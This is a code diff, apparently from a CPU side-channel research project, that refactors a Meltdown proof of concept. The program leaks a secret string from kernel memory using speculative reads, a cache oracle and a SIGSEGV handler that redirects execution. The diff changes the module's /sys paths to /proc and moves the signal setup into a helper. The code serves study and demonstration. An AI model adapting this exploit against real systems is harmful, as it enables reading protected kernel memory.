@@ -16,7 +16,7 @@
 
 #include "compiler_specifics.h"
 
-#ifndef __linux__
+#if !SAFESIDE_LINUX
 #  error Unsupported OS. Linux required.
 #endif
 
@@ -33,11 +33,9 @@
 
 #include "cache_sidechannel.h"
 #include "instr.h"
-
-// Objective: given some control over accesses to the *non-secret* string
-// "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" that is
-// stored only in the kernel memory.
-const char *public_data = "Hello, world!";
+#include "local_content.h"
+#include "meltdown_local_content.h"
+#include "utils.h"
 
 // Leaks the byte that is physically located at &text[0] + offset, without
 // really loading it. In the abstract machine, and in the code executed by the
@@ -48,11 +46,11 @@ const char *public_data = "Hello, world!";
 // execution, speculatively loading data accessible only in the kernel mode.
 static char LeakByte(const char *data, size_t offset) {
   CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
+  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
 
   for (int run = 0;; ++run) {
     // Load the kernel memory into the cache to speed up its leakage.
-    std::ifstream is("/sys/kernel/safeside_meltdown/length");
+    std::ifstream is("/proc/safeside_meltdown/length");
     is.get();
     is.close();
 
@@ -62,11 +60,11 @@ static char LeakByte(const char *data, size_t offset) {
     // value of the in-bounds access is usually different from the secret value
     // we want to leak via out-of-bounds speculative access.
     size_t safe_offset = run % strlen(public_data);
-    ForceRead(isolated_oracle.data() + static_cast<size_t>(data[safe_offset]));
+    ForceRead(oracle.data() + static_cast<size_t>(data[safe_offset]));
 
     // Access attempt to the kernel memory. This does not succeed
     // architecturally and kernel sends SIGSEGV instead.
-    ForceRead(isolated_oracle.data() + static_cast<size_t>(data[offset]));
+    ForceRead(oracle.data() + static_cast<size_t>(data[offset]));
 
     // SIGSEGV signal handler moves the instruction pointer to this label.
     asm volatile("afterspeculation:");
@@ -84,35 +82,9 @@ static char LeakByte(const char *data, size_t offset) {
   }
 }
 
-static void Sigsegv(
-    int /* signum */, siginfo_t * /* siginfo */, void *context) {
-  // SIGSEGV signal handler.
-  // Moves the instruction pointer to the "afterspeculation" label.
-  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
-#if SAFESIDE_X64
-  ucontext->uc_mcontext.gregs[REG_RIP] =
-      reinterpret_cast<greg_t>(afterspeculation);
-#elif SAFESIDE_IA32
-  ucontext->uc_mcontext.gregs[REG_EIP] =
-      reinterpret_cast<greg_t>(afterspeculation);
-#elif SAFESIDE_PPC
-  ucontext->uc_mcontext.regs->nip =
-      reinterpret_cast<size_t>(afterspeculation);
-#else
-#  error Unsupported CPU.
-#endif
-}
-
-static void SetSignal() {
-  struct sigaction act;
-  act.sa_sigaction = Sigsegv;
-  act.sa_flags = SA_SIGINFO;
-  sigaction(SIGSEGV, &act, NULL);
-}
-
 int main() {
   size_t private_data, private_length;
-  std::ifstream in("/sys/kernel/safeside_meltdown/address");
+  std::ifstream in("/proc/safeside_meltdown/address");
   if (in.fail()) {
     std::cerr << "Meltdown module not loaded or not running as root."
               << std::endl;
@@ -121,11 +93,11 @@ int main() {
   in >> std::hex >> private_data;
   in.close();
 
-  in.open("/sys/kernel/safeside_meltdown/length");
+  in.open("/proc/safeside_meltdown/length");
   in >> std::dec >> private_length;
   in.close();
 
-  SetSignal();
+  OnSignalMoveRipToAfterspeculation(SIGSEGV);
   std::cout << "Leaking the string: ";
   std::cout.flush();
   const size_t private_offset =
